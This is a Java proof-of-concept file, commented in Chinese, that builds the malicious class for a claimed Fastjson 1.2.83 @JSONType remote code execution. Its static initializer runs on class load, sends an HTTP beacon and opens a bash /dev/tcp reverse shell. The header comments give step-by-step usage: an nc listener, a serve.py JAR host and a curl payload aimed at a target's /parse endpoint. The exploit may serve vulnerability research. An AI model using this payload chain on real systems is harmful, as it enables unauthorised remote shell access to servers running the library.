/*
 * GenProbe.java - Fastjson 1.2.83 @JSONType RCE 恶意类构造
 *
 * 这个类就是被远程加载的"恶意类"。关键点:
 *   1. @JSONType 注解 - 使 Fastjson 的 TypeCollector.hasJsonType() 返回 true
 *   2. 静态初始化块 <clinit> - 在类定义阶段自动执行，无需实例化
 *   3. 默认行为: 反弹 shell 到 127.0.0.1:4444
 *
 * 构建方式:
 *   python3 serve.py --build-only --force-build --cb-host 127.0.0.1 --cb-port 4444
 *
 * 注意:
 *   serve.py 会修补 class 内部名，使其与 payload 的 @type 匹配。
 *   不要手工 javac + jar 生成 probe，否则只能触发 /probe 下载，无法执行 <clinit>。
 *
 * 使用方式:
 *   # 终端 1: 启动 nc 监听
 *   nc -lvnp 4444
 *
 *   # 终端 2: 启动 HTTP 服务托管 JAR
 *   python3 serve.py
 *
 *   # 终端 3: 发送 payload
 *   curl -X POST -H 'Content-Type: application/json' \
 *     --data '{"@type":"jar:http:..3232235777:19090.probe!.GenProbe"}' \
 *     http://target:18080/parse
 */

package com.alibaba.fastjson.poc;

import com.alibaba.fastjson.annotation.JSONType;

@JSONType  // 关键: 这个注解使 Fastjson 的 jsonType=true
public class GenProbe {

    // <clinit> 静态初始化块 - 在类定义阶段自动执行
    static {
        // 1. HTTP 回调验证 - 确认类被成功加载
        httpGet("http://127.0.0.1:19090/beacon");

        // 2. 标准 bash 反弹 shell
        //    使用 bash -i >& /dev/tcp/IP/PORT 0>&1 标准方式
        bashRevShell("127.0.0.1", 4444);

    }

    /** 标准 bash 反弹 shell - 使用 bash -i >& /dev/tcp/IP/PORT 0>&1 */
    static void bashRevShell(String host, int port) {
        try {
            // 标准 bash 反弹 shell 命令
            String cmd = "bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1";
            Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
        } catch (Exception ignored) {}
    }

    /** HTTP 回调 - 用于验证类是否被成功加载 */
    static void httpGet(String url) {
        try {
            new java.net.URL(url).openStream().close();
        } catch (Exception ignored) {}
    }
}
